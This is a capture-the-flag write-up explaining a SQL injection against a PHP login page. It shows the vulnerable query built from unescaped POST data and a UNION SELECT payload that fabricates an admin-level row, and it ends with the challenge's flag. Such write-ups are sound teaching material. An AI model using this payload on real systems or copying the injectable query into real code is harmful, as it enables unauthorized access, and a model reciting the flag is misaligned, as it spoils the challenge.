Injection 2
===========

Using unescaped POST data in PHP for MySQL requests is very bad. Here we have
(in the source):

```PHP
<?php
// ...
$username = $_POST["username"];
$password = $_POST["password"];
$debug = $_POST["debug"];
$query = "SELECT * FROM users WHERE username='$username'";
$result = mysqli_query($con, $query);
// ...
?>
```

So, a user can pass in any string to `$username`, and if it contains a 
single-quote, we can execute custom SQL commands.

The database contains no data, so we must generate a fake result. To do this, 
we use a combination of **union** and **select** to create fake data:

```SQL
union select * from (select 1 as id, 'a' as username, 'a' as password, 1, 1337 as user_level) as fake
```
- The value 1' is just an arbitrary value for an unnamed row, so that when we 
`union` this result, it has the same number of columns as the database (which 
is apparently five).
- The value '1337' allows us to get past the user\_level check:
```PHP
if ($row["user_level"] >= 1337) {
      echo "<p>Your flag is: $FLAG</p>";
} else {
      echo "<p>Only user levels 1337 or above can see the flag.</p>";
}
```

We also use `as` to give our fake row a name.

We want to pass in this command so that `$username` has a **value** +
 **a single-quote** + _the rest of our command_. To do thsi, we now have:
```
a' union select * from (select 1 as id, 'a' as username, 'a' as password, 1, 1337 as user_level) as fake union select * from users where password='a
```
- The last part (union select ... where password) is so that we can keep an 
even number of single-quotes, so that the enclosing single-quote from the 
original `$query` command is matched.
- Putting it all together, when we pass in our input for `$username` (we also 
pass in the value "a" for `$password`), the query on the server will be:
```SQL
SELECT * FROM users WHERE username='a' union select * from (select 1 as id, 'a' as username, 'a' as password, 1, 1337 as user_level) as fake union select * from users where password='a'
```

Our flag is `flag_nJZAKGWYt7YfzmTsCV`
